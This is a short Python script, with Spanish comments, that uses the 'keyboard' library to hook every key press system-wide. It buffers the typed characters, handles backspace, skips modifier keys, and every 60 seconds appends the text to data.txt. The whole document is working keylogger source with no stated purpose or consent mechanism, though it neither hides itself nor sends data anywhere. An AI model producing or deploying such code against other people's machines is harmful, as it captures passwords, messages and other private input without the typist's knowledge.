# pip install keyboard
import threading

import keyboard

key_buffer = []
buffer_lock = threading.Lock()

IGNORED_KEYS = {
    "shift", "ctrl", "alt", "caps lock",
    "tab", "enter", "esc", "up", "down", "left", "right", "mayusculas", "alt gr"
}

def pressedKeys(event):
    with buffer_lock:
        combo = keyboard.get_hotkey_name()

        
        if event.name == "space":
            key_buffer.append(" ")
        elif event.name == "backspace":
            # Eliminar el último carácter si existe
            if key_buffer:
                key_buffer.pop()
        elif event.name not in IGNORED_KEYS:
            key_buffer.append(event.name)

def write_buffer_to_file():
    global key_buffer
    threading.Timer(60.0, write_buffer_to_file).start()

    with buffer_lock:
        if not key_buffer:
            return

        with open("data.txt", "a", encoding="utf-8") as file:
            file.write("".join(key_buffer))
        
        key_buffer.clear()

write_buffer_to_file()
keyboard.on_press(pressedKeys)
keyboard.wait()
